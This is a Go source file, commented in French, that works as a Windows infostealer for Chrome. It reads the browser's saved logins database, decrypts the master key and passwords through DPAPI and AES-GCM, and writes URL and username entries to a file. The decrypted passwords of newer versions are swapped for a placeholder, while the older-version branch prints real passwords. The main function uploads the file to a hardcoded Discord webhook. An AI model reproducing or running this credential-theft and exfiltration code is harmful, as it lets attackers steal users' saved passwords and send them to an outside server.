package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	dataPath       string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
	masterKey      []byte
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func getMasterKey() ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

func password() {
	PasswordTXT := ""
	//Check for Login Data file
	if !checkFileExist(dataPath) {
		os.Exit(0)
	}

	//Copy Login Data file to temp location
	err := copyFileToDirectory(dataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}

	//Open Database
	db, err := sql.Open("sqlite3", os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	//Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var URL string
		var USERNAME string
		var PASSWORD string

		err = rows.Scan(&URL, &USERNAME, &PASSWORD)
		if err != nil {
			log.Fatal(err)
		}
		//Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10") { // Means it's chrome 80 or higher
			PASSWORD = strings.Trim(PASSWORD, "v10")

			//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
			if string(masterKey) != "" {
				ciphertext := []byte(PASSWORD)
				c, err := aes.NewCipher(masterKey)
				if err != nil {

					fmt.Println(err)
				}
				gcm, err := cipher.NewGCM(c)
				if err != nil {
					fmt.Println(err)
				}
				nonceSize := gcm.NonceSize()
				if len(ciphertext) < nonceSize {
					fmt.Println(err)
				}

				nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
				plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
				if err != nil {
					fmt.Println(err)
				}
				if string(plaintext) != "" {
					PasswordTXT = PasswordTXT + URL + " | " + USERNAME + " | " + "MDP en clair" + "\n"
					//PasswordTXT = PasswordTXT + URL + " | " + USERNAME + " | " + string(plaintext) + "\n"
					//fmt.Println(URL," | ", USERNAME," | ", "**DEMO**")

				}
			} else { // It the masterkey hasn't been requested yet, then gets it.
				mkey, err := getMasterKey()
				if err != nil {
					fmt.Println(err)
				}
				masterKey = mkey
			}
		} else { //Means it's chrome v. < 80
			pass, err := Decrypt([]byte(PASSWORD))
			if err != nil {
				log.Fatal(err)
			}

			if URL != "" && string(pass) != "" {
				fmt.Println(URL, USERNAME, string(pass))
			}
		}

		//Check if no value, if none skip

	}
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Print(PasswordTXT)
	os.Remove("./assets/passwordChrome.txt")
	os.WriteFile("./assets/passwordChrome.txt", []byte(PasswordTXT), 0666)
}

// Structure de la charge utile du webhook
type Payload struct {
	Event   string `json:"event"`
	Content string `json:"content"`
	Data    string `json:"data"`
}

func sendWebhook(url string, event string, data string, key string) error {
	file, err := os.Open("./assets/passwordChrome.txt")
	if err != nil {
		return fmt.Errorf("erreur lors de l'ouverture du fichier : %w", err)
	}
	defer file.Close()

	// Créer un buffer pour contenir les données multipart
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Ajouter le fichier dans le formulaire multipart
	part, err := writer.CreateFormFile("file", file.Name())
	if err != nil {
		return fmt.Errorf("erreur lors de la création de la partie fichier : %w", err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("erreur lors de la copie du fichier dans la requête : %w", err)
	}

	// Ajouter les données JSON dans le formulaire multipart
	t := time.Now()
	payload := Payload{
		Event:   event,
		Content: t.Format("02/01/2006 : 15h04") + " - " + key, // Contenu de l'événement
		Data:    data,
	}

	// Conversion du payload en JSON
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("erreur lors de la conversion du payload en JSON: %w", err)
	}

	// Ajouter les données JSON sous forme de champ dans le multipart
	err = writer.WriteField("payload_json", string(payloadBytes))
	if err != nil {
		return fmt.Errorf("erreur lors de l'ajout du JSON au formulaire : %w", err)
	}

	// Fermer l'écrivain multipart pour finaliser la requête
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("erreur lors de la fermeture du writer multipart : %w", err)
	}

	// Envoi de la requête POST au webhook avec le corps multipart
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return fmt.Errorf("erreur lors de la création de la requête HTTP: %w", err)
	}

	// Définir le type de contenu comme multipart
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Envoi de la requête HTTP
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("erreur lors de l'envoi du webhook: %w", err)
	}
	defer resp.Body.Close()

	// Vérification de la réponse HTTP
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("échec de l'envoi du webhook, statut HTTP: %d", resp.StatusCode)
	}

	return nil
}

func main() {

	password()
	// Chiffrement du fichier et récupération de la clé
	key := encryptFile() // Chiffre le fichier et retourne la clé
	if key == "" {
		fmt.Println("Erreur de chiffrement du fichier.")
		return
	}

	// URL du webhook
	webhookURL := "https://discord.com/api/webhooks/1308726115652599850/esor8uXZ1OM9ELoq4zh6PhceWPB4xFJ_DPTDHV1nri1U68mfON-oghCfwh3qrnz0str-"

	// Variables à envoyer dans le webhook
	t := time.Now()
	event := "nouvel_evenement"
	data := "cette variable a été envoyée à " + t.Format("2006-01-02 15:04:05") // Envoi du webhook avec les données chiffrées
	err := sendWebhook(webhookURL, event, data, key)
	if err != nil {
		fmt.Printf("Erreur lors de l'envoi du webhook: %v\n", err)
	}
}

// Fonction pour chiffrer un fichier
func encryptFile() string {
	// Lecture du fichier ./text.txt
	data, err := os.ReadFile("./assets/passwordChrome.txt")
	if err != nil {
		fmt.Println("Erreur lors de la lecture du fichier:", err)
		return ""
	}

	// Génération de la clé de chiffrement (256 bits pour AES)
	key := make([]byte, 32) // 256 bits pour AES
	if _, err := rand.Read(key); err != nil {
		fmt.Println("Erreur lors de la génération de la clé:", err)
		return ""
	}

	// Création du bloc AES
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Erreur lors de la création du bloc AES:", err)
		return ""
	}

	// Initialisation du mode GCM
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Erreur lors de l'initialisation du mode GCM:", err)
		return ""
	}

	// Génération du nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println("Erreur lors de la génération du nonce:", err)
		return ""
	}

	// Chiffrement des données
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	// Encodage de la clé et du texte chiffré en hexadécimal
	encKey := hex.EncodeToString(key)
	encData := hex.EncodeToString(ciphertext)

	// Sauvegarde du texte chiffré dans un fichier
	os.Remove("./assets/crypt.txt") // Supprimer le fichier existant
	os.WriteFile("./assets/crypt.txt", []byte(encData), 0666)

	// Retourner la clé encodée
	return encKey
}
